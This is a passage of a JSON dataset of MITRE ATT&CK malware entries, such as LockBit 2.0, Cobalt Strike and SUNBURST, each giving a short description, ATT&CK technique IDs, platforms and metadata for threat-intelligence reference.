      "id": "S1043",
      "name": "ccf32",
      "description": "[ccf32](https://attack.mitre.org/software/S1043) is data collection malware that has been used since at least February 2019, most notably during the [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign; there is also a similar x64 version.(Citation: Bitdefender FunnyDream Campaign November 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1005",
        "T1119",
        "T1048.003",
        "T1074.002",
        "T1560.001",
        "T1059.003",
        "T1124",
        "T1070.004",
        "T1564.001",
        "T1074.001",
        "T1053.005",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1043",
      "stix_id": "malware--a394448a-4576-41b8-81cc-9b61abad94ab",
      "created": "2022-09-22T20:11:10.003000+00:00",
      "modified": "2025-04-16T20:38:28.343000+00:00"
    },
    "S1190": {
      "id": "S1190",
      "name": "Kapeka",
      "description": "Kapeka is a backdoor written in C++ used against victims in Eastern Europe since at least mid-2022. Kapeka has technical overlaps with [Exaramel for Windows](https://attack.mitre.org/software/S0343) and [Prestige](https://attack.mitre.org/software/S1058) malware variants, both of which are linked to [Sandworm Team](https://attack.mitre.org/groups/G0034). Kapeka may have been used in advance of [Prestige](https://attack.mitre.org/software/S1058) deployment in late 2022.(Citation: WithSecure Kapeka 2024)(Citation: Microsoft KnuckleTouch 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1218.011",
        "T1036.008",
        "T1082",
        "T1059.003",
        "T1112",
        "T1053.005",
        "T1071.001",
        "T1070.009",
        "T1132.001",
        "T1012",
        "T1140",
        "T1090",
        "T1106",
        "T1027.013"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1190",
      "stix_id": "malware--a43e55c9-0b7c-42c0-81de-b7a42d724db9",
      "created": "2025-01-06T22:40:58.386000+00:00",
      "modified": "2025-03-11T13:11:41.929000+00:00"
    },
    "S1199": {
      "id": "S1199",
      "name": "LockBit 2.0",
      "description": "[LockBit 2.0](https://attack.mitre.org/software/S1199) is an affiliate-based Ransomware-as-a-Service (RaaS) that has been in use since at least June 2021 as the successor to LockBit Ransomware. [LockBit 2.0](https://attack.mitre.org/software/S1199) has versions capable of infecting Windows and VMware ESXi virtual machines, and has been observed targeting multiple industry verticals globally.(Citation: FBI Lockbit 2.0 FEB 2022)(Citation: Palo Alto Lockbit 2.0 JUN 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1564.003",
        "T1547.001",
        "T1053.005",
        "T1059.003",
        "T1489",
        "T1548.002",
        "T1136",
        "T1112",
        "T1082",
        "T1140",
        "T1057",
        "T1083",
        "T1484.001",
        "T1120",
        "T1135",
        "T1070.001",
        "T1047",
        "T1480",
        "T1614.001",
        "T1562.001",
        "T1070.004",
        "T1021.002",
        "T1486",
        "T1059.001",
        "T1490"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1199",
      "stix_id": "malware--a4578560-42cf-4075-9fa2-056f0058c881",
      "created": "2025-01-24T22:09:44.468000+00:00",
      "modified": "2025-02-06T18:59:08.263000+00:00"
    },
    "S1171": {
      "id": "S1171",
      "name": "OilCheck",
      "description": "[OilCheck](https://attack.mitre.org/software/S1171) is a C#/.NET downloader that has been used by [OilRig](https://attack.mitre.org/groups/G0049) since at least 2022 including against targets in Israel. [OilCheck](https://attack.mitre.org/software/S1171) uses draft messages created in a shared email account for C2 communication.(Citation: ESET OilRig Downloaders DEC 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1567",
        "T1105",
        "T1102.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1171",
      "stix_id": "malware--a49725db-4a55-44cd-aefa-78b35d2d8641",
      "created": "2024-11-26T20:37:42.040000+00:00",
      "modified": "2024-11-27T19:47:36.502000+00:00"
    },
    "S0251": {
      "id": "S0251",
      "name": "Zebrocy",
      "description": "[Zebrocy](https://attack.mitre.org/software/S0251) is a Trojan that has been used by [APT28](https://attack.mitre.org/groups/G0007) since at least November 2015. The malware comes in several programming language variants, including C++, Delphi, AutoIt, C#, VB.NET, and Golang. (Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: CISA Zebrocy Oct 2020) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1124",
        "T1057",
        "T1047",
        "T1049",
        "T1105",
        "T1113",
        "T1120",
        "T1033",
        "T1056.004",
        "T1041",
        "T1082",
        "T1071.003",
        "T1071.001",
        "T1016",
        "T1083",
        "T1547.001",
        "T1027.002",
        "T1560",
        "T1037.001",
        "T1059.003",
        "T1573.002",
        "T1074.001",
        "T1012",
        "T1070.004",
        "T1132.001",
        "T1135",
        "T1140",
        "T1119",
        "T1053.005",
        "T1555.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0251",
      "stix_id": "malware--a4f57468-fbd5-49e4-8476-52088220b92d",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:44:17.288000+00:00"
    },
    "S0664": {
      "id": "S0664",
      "name": "Pandora",
      "description": "[Pandora](https://attack.mitre.org/software/S0664) is a multistage kernel rootkit with backdoor functionality that has been in use by [Threat Group-3390](https://attack.mitre.org/groups/G0027) since at least 2020.(Citation: Trend Micro Iron Tiger April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1574.001",
        "T1573.001",
        "T1068",
        "T1543.003",
        "T1071.001",
        "T1057",
        "T1205",
        "T1027.015",
        "T1569.002",
        "T1553.006",
        "T1055",
        "T1112"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0664",
      "stix_id": "malware--a545456a-f9a7-47ad-9ea6-8b017def38d1",
      "created": "2021-11-29T19:53:06.360000+00:00",
      "modified": "2025-04-16T20:38:28.723000+00:00"
    },
    "S0182": {
      "id": "S0182",
      "name": "FinFisher",
      "description": "[FinFisher](https://attack.mitre.org/software/S0182) is a government-grade commercial surveillance spyware reportedly sold exclusively to government agencies for use in targeted and lawful criminal investigations. It is heavily obfuscated and uses multiple anti-analysis techniques. It has other variants including [Wingbird](https://attack.mitre.org/software/S0176). (Citation: FinFisher Citation) (Citation: Microsoft SIR Vol 21) (Citation: FireEye FinSpy Sept 2017) (Citation: Securelist BlackOasis Oct 2017) (Citation: Microsoft FinFisher March 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1134.001",
        "T1113",
        "T1547.001",
        "T1497.001",
        "T1574.001",
        "T1056.004",
        "T1027.002",
        "T1055.001",
        "T1548.002",
        "T1070.001",
        "T1083",
        "T1542.003",
        "T1012",
        "T1543.003",
        "T1027.016",
        "T1036.005",
        "T1140",
        "T1057",
        "T1518.001",
        "T1082",
        "T1027",
        "T1574.013"
      ],
      "platforms": [
        "Windows",
        "Android"
      ],
      "url": "https://attack.mitre.org/software/S0182",
      "stix_id": "malware--a5528622-3a8a-4633-86ce-8cdaf8423858",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2024-09-12T17:23:46.687000+00:00"
    },
    "S0374": {
      "id": "S0374",
      "name": "SpeakUp",
      "description": "[SpeakUp](https://attack.mitre.org/software/S0374) is a Trojan backdoor that targets both Linux and OSX devices. It was first observed in January 2019. (Citation: CheckPoint SpeakUp Feb 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1053.003",
        "T1105",
        "T1059.006",
        "T1110.001",
        "T1033",
        "T1046",
        "T1071.001",
        "T1016",
        "T1203",
        "T1070.004",
        "T1059",
        "T1132.001",
        "T1027.013",
        "T1049"
      ],
      "platforms": [
        "Linux",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0374",
      "stix_id": "malware--a5575606-9b85-4e3d-9cd2-40ef30e3672d",
      "created": "2019-04-17T18:43:36.156000+00:00",
      "modified": "2024-04-11T00:02:59.341000+00:00"
    },
    "S1142": {
      "id": "S1142",
      "name": "LunarMail",
      "description": "[LunarMail](https://attack.mitre.org/software/S1142) is a backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2020 including in a compromise of a European ministry of foreign affairs (MFA) in conjunction with [LunarLoader](https://attack.mitre.org/software/S1143) and [LunarWeb](https://attack.mitre.org/software/S1141). [LunarMail](https://attack.mitre.org/software/S1142) is designed to be deployed on workstations and can use email messages and [Steganography](https://attack.mitre.org/techniques/T1001/002) in command and control.(Citation: ESET Turla Lunar toolset May 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1114.001",
        "T1070.008",
        "T1041",
        "T1140",
        "T1204.002",
        "T1027.013",
        "T1083",
        "T1059.005",
        "T1070.004",
        "T1082",
        "T1095",
        "T1001.002",
        "T1113",
        "T1543",
        "T1071.003",
        "T1137.006",
        "T1074.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1142",
      "stix_id": "malware--a5789a26-2b7b-4b2d-a25f-31182468d4bb",
      "created": "2024-06-26T20:21:21.137000+00:00",
      "modified": "2024-08-16T14:42:54.472000+00:00"
    },
    "S1116": {
      "id": "S1116",
      "name": "WARPWIRE",
      "description": "[WARPWIRE](https://attack.mitre.org/software/S1116) is a Javascript credential stealer that targets plaintext passwords and usernames for exfiltration that was used during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) to target Ivanti Connect Secure VPNs.(Citation: Mandiant Cutting Edge January 2024)(Citation: Mandiant Cutting Edge Part 2 January 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1554",
        "T1048.003",
        "T1059.007",
        "T1056.003",
        "T1132.001"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1116",
      "stix_id": "malware--a5818d36-e9b0-46da-842d-b727a5e36ea6",
      "created": "2024-03-05T19:32:16.643000+00:00",
      "modified": "2025-04-15T19:46:34.954000+00:00"
    },
    "S0235": {
      "id": "S0235",
      "name": "CrossRAT",
      "description": "[CrossRAT](https://attack.mitre.org/software/S0235) is a cross platform RAT.",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1113",
        "T1543.001",
        "T1083",
        "T1547.001",
        "T1547.013"
      ],
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0235",
      "stix_id": "malware--a5e91d50-24fa-44ec-9894-39a88f658cea",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2023-09-28T21:03:22.526000+00:00"
    },
    "S0072": {
      "id": "S0072",
      "name": "OwaAuth",
      "description": "[OwaAuth](https://attack.mitre.org/software/S0072) is a Web shell and credential stealer deployed to Microsoft Exchange servers that appears to be exclusively used by [Threat Group-3390](https://attack.mitre.org/groups/G0027). (Citation: Dell TG-3390)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1505.003",
        "T1036.005",
        "T1056.001",
        "T1083",
        "T1070.006",
        "T1560.003",
        "T1505.004",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0072",
      "stix_id": "malware--a60657fa-e2e7-4f8f-8128-a882534ae8c5",
      "created": "2017-05-31T21:32:47.412000+00:00",
      "modified": "2025-04-25T14:44:19.163000+00:00"
    },
    "S0454": {
      "id": "S0454",
      "name": "Cadelspy",
      "description": "[Cadelspy](https://attack.mitre.org/software/S0454) is a backdoor that has been used by [APT39](https://attack.mitre.org/groups/G0087).(Citation: Symantec Chafer Dec 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1010",
        "T1056.001",
        "T1560",
        "T1115",
        "T1123",
        "T1082",
        "T1113",
        "T1120"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0454",
      "stix_id": "malware--a705b085-1eae-455e-8f4d-842483d814eb",
      "created": "2020-05-22T20:07:15.628000+00:00",
      "modified": "2025-04-25T14:44:19.544000+00:00"
    },
    "S0154": {
      "id": "S0154",
      "name": "Cobalt Strike",
      "description": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as \u201cadversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors\u201d. Cobalt Strike\u2019s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual)\n\nIn addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1090.004",
        "T1548.003",
        "T1553.002",
        "T1059.007",
        "T1021.001",
        "T1106",
        "T1550.002",
        "T1078.002",
        "T1027.005",
        "T1548.002",
        "T1016",
        "T1569.002",
        "T1005",
        "T1562.001",
        "T1055.001",
        "T1056.001",
        "T1197",
        "T1055.012",
        "T1518",
        "T1078.003",
        "T1090.001",
        "T1068",
        "T1113",
        "T1564.010",
        "T1112",
        "T1069.002",
        "T1049",
        "T1001.003",
        "T1134.004",
        "T1134.001",
        "T1543.003",
        "T1059.005",
        "T1055",
        "T1007",
        "T1070.006",
        "T1083",
        "T1071.004",
        "T1029",
        "T1069.001",
        "T1059.001",
        "T1021.004",
        "T1620",
        "T1018",
        "T1003.001",
        "T1012",
        "T1087.002",
        "T1030",
        "T1046",
        "T1135",
        "T1071.001",
        "T1573.002",
        "T1185",
        "T1140",
        "T1572",
        "T1021.006",
        "T1573.001",
        "T1095",
        "T1132.001",
        "T1105",
        "T1021.002",
        "T1218.011",
        "T1071.002",
        "T1059.006",
        "T1047",
        "T1003.002",
        "T1134.003",
        "T1203",
        "T1021.003",
        "T1057",
        "T1137.001",
        "T1059.003",
        "T1027"
      ],
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0154",
      "stix_id": "malware--a7881f21-e978-4fe4-af56-92c9416a2616",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2024-09-25T20:32:57.099000+00:00"
    },
    "S1168": {
      "id": "S1168",
      "name": "SampleCheck5000",
      "description": "[SampleCheck5000](https://attack.mitre.org/software/S1168) is a downloader with multiple variants that was used by [OilRig](https://attack.mitre.org/groups/G0049) including during the [Outer Space](https://attack.mitre.org/campaigns/C0042) campaign to download and execute additional payloads. (Citation: ESET OilRig Campaigns Sep 2023)(Citation: ESET OilRig Downloaders DEC 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1102.002",
        "T1105",
        "T1140",
        "T1560.001",
        "T1059.003",
        "T1071.001",
        "T1082",
        "T1074.001",
        "T1567"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1168",
      "stix_id": "malware--a87c8100-8735-440e-8ee4-27aabb643592",
      "created": "2024-11-25T19:14:25.846000+00:00",
      "modified": "2024-11-26T19:54:38.780000+00:00"
    },
    "S0559": {
      "id": "S0559",
      "name": "SUNBURST",
      "description": "[SUNBURST](https://attack.mitre.org/software/S0559) is a trojanized DLL designed to fit within the SolarWinds Orion software update framework. It was used by [APT29](https://attack.mitre.org/groups/G0016) since at least February 2020.(Citation: SolarWinds Sunburst Sunspot Update January 2021)(Citation: Microsoft Deep Dive Solorigate January 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1497.003",
        "T1562.001",
        "T1047",
        "T1082",
        "T1112",
        "T1573.001",
        "T1132.001",
        "T1070.009",
        "T1005",
        "T1124",
        "T1083",
        "T1016",
        "T1027",
        "T1546.012",
        "T1218.011",
        "T1027.015",
        "T1007",
        "T1036.005",
        "T1553.002",
        "T1057",
        "T1001.003",
        "T1001.001",
        "T1059.005",
        "T1071.004",
        "T1070.004",
        "T1070.007",
        "T1497.001",
        "T1012",
        "T1518.001",
        "T1033",
        "T1105",
        "T1027.005",
        "T1071.001",
        "T1001.002",
        "T1568",
        "T1070"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0559",
      "stix_id": "malware--a8839c95-029f-44cf-8f3d-a3cf2039e927",
      "created": "2021-01-05T22:42:05.965000+00:00",
      "modified": "2023-12-26T19:44:49.643000+00:00"
    },
    "S0396": {
      "id": "S0396",
      "name": "EvilBunny",
      "description": "[EvilBunny](https://attack.mitre.org/software/S0396) is a C++ malware sample observed since 2011 that was designed to be a execution platform for Lua scripts.(Citation: Cyphort EvilBunny Dec 2014)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1106",
        "T1105",
        "T1547.001",
        "T1059.011",
        "T1124",
        "T1071.001",
        "T1047",
        "T1497.001",
        "T1203",
        "T1059.003",
        "T1053.005",
        "T1070.004",
        "T1497.003",
        "T1057",
        "T1518.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0396",
      "stix_id": "malware--a8a778f5-0035-4870-bb25-53dc05029586",
      "created": "2019-06-28T17:40:32.217000+00:00",
      "modified": "2024-08-05T18:21:34.265000+00:00"
    },
    "S0176": {
      "id": "S0176",
      "name": "Wingbird",
      "description": "[Wingbird](https://attack.mitre.org/software/S0176) is a backdoor that appears to be a version of commercial software [FinFisher](https://attack.mitre.org/software/S0182). It is reportedly used to attack individual computers instead of networks. It was used by [NEODYMIUM](https://attack.mitre.org/groups/G0055) in a May 2016 campaign. (Citation: Microsoft SIR Vol 21) (Citation: Microsoft NEODYMIUM Dec 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.008",
        "T1574.001",
        "T1070.004",
        "T1569.002",
        "T1543.003",
        "T1518.001",
        "T1068",
        "T1055",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0176",
      "stix_id": "malware--a8d3d497-2da9-4797-8e0b-ed176be08654",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:44:20.703000+00:00"
    },
    "S0338": {
      "id": "S0338",
      "name": "Cobian RAT",
      "description": "[Cobian RAT](https://attack.mitre.org/software/S0338) is a backdoor, remote access tool that has been observed since 2016.(Citation: Zscaler Cobian Aug 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1113",
        "T1125",
        "T1547.001",
        "T1059.003",
        "T1056.001",
        "T1071.004",
        "T1123",
        "T1132.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0338",
      "stix_id": "malware--aa1462a1-d065-416c-b354-bedd04998c7f",
      "created": "2019-01-29T21:40:37.350000+00:00",
      "modified": "2025-04-25T14:44:21.097000+00:00"
    },
    "S0431": {
      "id": "S0431",
      "name": "HotCroissant",
      "description": "[HotCroissant](https://attack.mitre.org/software/S0431) is a remote access trojan (RAT) attributed by U.S. government entities to malicious North Korean government cyber activity, tracked collectively as HIDDEN COBRA.(Citation: US-CERT HOTCROISSANT February 2020) [HotCroissant](https://attack.mitre.org/software/S0431) shares numerous code similarities with [Rifdoor](https://attack.mitre.org/software/S0433).(Citation: Carbon Black HotCroissant April 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1041",
        "T1573.001",
        "T1070.004",
        "T1106",
        "T1027.002",
        "T1083",
        "T1489",
        "T1105",
        "T1059.003",
        "T1057",
        "T1007",
        "T1033",
        "T1027.013",
        "T1010",
        "T1518",
        "T1082",
        "T1113",
        "T1016",
        "T1053.005",
        "T1564.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0431",
      "stix_id": "malware--aad11e34-02ca-4220-91cd-2ed420af4db3",
      "created": "2020-05-01T19:10:31.446000+00:00",
      "modified": "2024-04-11T02:17:38.807000+00:00"
    },
    "S0382": {
      "id": "S0382",
      "name": "ServHelper",
      "description": "[ServHelper](https://attack.mitre.org/software/S0382) is a backdoor first observed in late 2018. The backdoor is written in Delphi and is typically delivered as a DLL file.(Citation: Proofpoint TA505 Jan 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1573.002",
        "T1071.001",
        "T1105",
        "T1136.001",
        "T1082",
        "T1021.001",
        "T1547.001",
        "T1059.001",
        "T1036.010",
        "T1033",
        "T1218.011",
        "T1070.004",
        "T1053.005",
        "T1098.007"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0382",
      "stix_id": "malware--aae22730-e571-4d17-b037-65f2a3e26213",
      "created": "2019-05-29T13:14:38.638000+00:00",
      "modified": "2025-04-16T20:38:29.531000+00:00"
    },
    "S0389": {
      "id": "S0389",
      "name": "JCry",
      "description": "[JCry](https://attack.mitre.org/software/S0389) is ransomware written in Go. It was identified as apart of the #OpJerusalem 2019 campaign.(Citation: Carbon Black JCry May 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1486",
        "T1547.001",
        "T1059.001",
        "T1059.005",
        "T1204.002",
        "T1059.003",
        "T1490"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0389",
      "stix_id": "malware--aaf3fa65-8b27-4e68-91de-2b7738fe4c82",
      "created": "2019-06-18T17:20:43.635000+00:00",
      "modified": "2025-04-25T14:44:21.898000+00:00"
    },
    "S0130": {
      "id": "S0130",
      "name": "Unknown Logger",
      "description": "[Unknown Logger](https://attack.mitre.org/software/S0130) is a publicly released, free backdoor. Version 1.5 of the backdoor has been used by the actors responsible for the MONSOON campaign. (Citation: Forcepoint Monsoon)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1033",
        "T1091",
        "T1105",
        "T1016",
        "T1555.003",
        "T1056.001",
        "T1562.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0130",
      "stix_id": "malware--ab3580c8-8435-4117-aace-3d9fbe46aa56",
      "created": "2017-05-31T21:33:15.020000+00:00",
      "modified": "2025-04-25T14:44:22.301000+00:00"
    },
    "S0496": {
      "id": "S0496",
      "name": "REvil",
      "description": "[REvil](https://attack.mitre.org/software/S0496) is a ransomware family that has been linked to the [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) group and operated as ransomware-as-a-service (RaaS) since at least April 2019. [REvil](https://attack.mitre.org/software/S0496), which as been used against organizations in the manufacturing, transportation, and electric sectors, is highly configurable and shares code similarities with the GandCrab RaaS.(Citation: Secureworks REvil September 2019)(Citation: Intel 471 REvil March 2020)(Citation: Group IB Ransomware May 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1562.009",
        "T1486",
        "T1059.003",
        "T1562.001",
        "T1059.001",
        "T1573.002",
        "T1055",
        "T1036.005",
        "T1112",
        "T1485",
        "T1012",
        "T1059.005",
        "T1041",
        "T1489",
        "T1082",
        "T1106",
        "T1204.002",
        "T1134.002",
        "T1480.002",
        "T1083",
        "T1027.013",
        "T1189",
        "T1007",
        "T1047",
        "T1140",
        "T1566.001",
        "T1105",
        "T1614.001",
        "T1134.001",
        "T1071.001",
        "T1069.002",
        "T1070.004",
        "T1490",
        "T1027.011"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0496",
      "stix_id": "malware--ac61f1f9-7bb1-465e-9b8a-c2ce8e88baf5",
      "created": "2020-08-04T15:06:14.796000+00:00",
      "modified": "2024-11-17T23:08:38.543000+00:00"
    },
    "S0003": {
      "id": "S0003",
      "name": "RIPTIDE",
      "description": "[RIPTIDE](https://attack.mitre.org/software/S0003) is a proxy-aware backdoor used by [APT12](https://attack.mitre.org/groups/G0005). (Citation: Moran 2014)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1573.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0003",
      "stix_id": "malware--ad4f146f-e3ec-444a-ba71-24bffd7f0f8e",
      "created": "2017-05-31T21:32:11.911000+00:00",
      "modified": "2025-04-25T14:44:22.846000+00:00"
    },
    "S0476": {
      "id": "S0476",
      "name": "Valak",
      "description": "[Valak](https://attack.mitre.org/software/S0476) is a multi-stage modular malware that can function as a standalone information stealer or downloader, first observed in 2019 targeting enterprises in the US and Germany.(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1112",
        "T1555.004",
        "T1057",
        "T1564.004",
        "T1027",
        "T1218.010",
        "T1071.001",
        "T1104",
        "T1008",
        "T1518.001",
        "T1204.002",
        "T1113",
        "T1033",
        "T1559.002",
        "T1059.007",
        "T1082",
        "T1566.001",
        "T1119",
        "T1105",
        "T1041",
        "T1552.002",
        "T1016",
        "T1114.002",
        "T1027.002",
        "T1027.011",
        "T1012",
        "T1053.005",
        "T1140",
        "T1132.001",
        "T1087.002",
        "T1087.001",
        "T1059.001",
        "T1047",
        "T1566.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0476",
      "stix_id": "malware--ade37ada-14af-4b44-b36c-210eec255d53",
      "created": "2020-06-19T17:11:54.854000+00:00",
      "modified": "2025-04-16T20:38:30.200000+00:00"
    },
    "S1099": {
      "id": "S1099",
      "name": "Samurai",
      "description": "[Samurai](https://attack.mitre.org/software/S1099) is a passive backdoor that has been used by [ToddyCat](https://attack.mitre.org/groups/G1022) since at least 2020. [Samurai](https://attack.mitre.org/software/S1099) allows arbitrary C# code execution and is used with multiple modules for remote administration and lateral movement.(Citation: Kaspersky ToddyCat June 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1095",
        "T1543.003",
        "T1573.001",
        "T1083",
        "T1027.015",
        "T1112",
        "T1027.004",
        "T1132.001",
        "T1012",
        "T1036.005",
        "T1090",
        "T1059.003",
        "T1071.001",
        "T1027.007",
        "T1027",
        "T1106",
        "T1005",
        "T1518"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1099",
      "stix_id": "malware--ae91fb8f-5031-4f57-9839-e3be3ed503f0",
      "created": "2024-01-04T20:01:26.144000+00:00",
      "modified": "2024-01-04T20:02:49.672000+00:00"
    },
    "S0048": {
      "id": "S0048",
      "name": "PinchDuke",
      "description": "[PinchDuke](https://attack.mitre.org/software/S0048) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2008 to 2010. (Citation: F-Secure The Dukes)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1003",
        "T1071.001",
        "T1082",
        "T1555",
        "T1555.003",
        "T1005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0048",
      "stix_id": "malware--ae9d818d-95d0-41da-b045-9cabea1ca164",
      "created": "2017-05-31T21:32:35.780000+00:00",
      "modified": "2025-04-25T14:44:24.120000+00:00"
    },
    "S1015": {
      "id": "S1015",
      "name": "Milan",
      "description": "[Milan](https://attack.mitre.org/software/S1015) is a backdoor implant based on [DanBot](https://attack.mitre.org/software/S1014) that was written in Visual C++ and .NET. [Milan](https://attack.mitre.org/software/S1015) has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least June 2020.(Citation: ClearSky Siamesekitten August 2021)(Citation: Kaspersky Lyceum October 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1053.005",
        "T1074.001",
        "T1071.004",
        "T1082",
        "T1016",
        "T1033",
        "T1027.013",
        "T1105",
        "T1559.001",
        "T1071.001",
        "T1012",
        "T1036",
        "T1572",
        "T1059.003",
        "T1106",
        "T1005",
        "T1087.001",
        "T1568.002",
        "T1070.004",
        "T1036.007"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1015",
      "stix_id": "malware--aea6d6b8-d832-4c90-a1bb-f52c6684db6c",
      "created": "2022-06-06T18:34:37.625000+00:00",
      "modified": "2024-04-11T00:43:16.261000+00:00"
    },
    "S0136": {
      "id": "S0136",
      "name": "USBStealer",
      "description": "[USBStealer](https://attack.mitre.org/software/S0136) is malware that has been used by [APT28](https://attack.mitre.org/groups/G0007) since at least 2005 to extract information from air-gapped networks. It does not have the capability to communicate over the Internet and has been used in conjunction with [ADVSTORESHELL](https://attack.mitre.org/software/S0045). (Citation: ESET Sednit USBStealer 2014) (Citation: Kaspersky Sofacy)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1025",
        "T1027.013",
        "T1083",
        "T1052.001",
        "T1070.006",
        "T1547.001",
        "T1119",
        "T1036.005",
        "T1020",
        "T1092",
        "T1091",
        "T1070.004",
        "T1120",
        "T1074.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0136",
      "stix_id": "malware--af2ad3b7-ab6a-4807-91fd-51bcaff9acbb",
      "created": "2017-05-31T21:33:17.716000+00:00",
      "modified": "2024-04-10T22:17:40.838000+00:00"
    },
    "S0352": {
      "id": "S0352",
      "name": "OSX_OCEANLOTUS.D",
      "description": "[OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) is a macOS backdoor used by [APT32](https://attack.mitre.org/groups/G0050). First discovered in 2015, [APT32](https://attack.mitre.org/groups/G0050) has continued to make improvements using a plugin architecture to extend capabilities, specifically using `.dylib` files. [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) can also determine it's permission level and execute according to access type (`root` or `user`).(Citation: Unit42 OceanLotus 2017)(Citation: TrendMicro MacOS April 2018)(Citation: Trend Micro MacOS Backdoor November 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.013",
        "T1095",
        "T1222.002",
        "T1070.004",
        "T1016",
        "T1497.001",
        "T1573.001",
        "T1140",
        "T1059.004",
        "T1082",
        "T1571",
        "T1543.001",
        "T1105",
        "T1059.005",
        "T1564.001",
        "T1070.006",
        "T1071.001",
        "T1132.001",
        "T1543.004",
        "T1027.002",
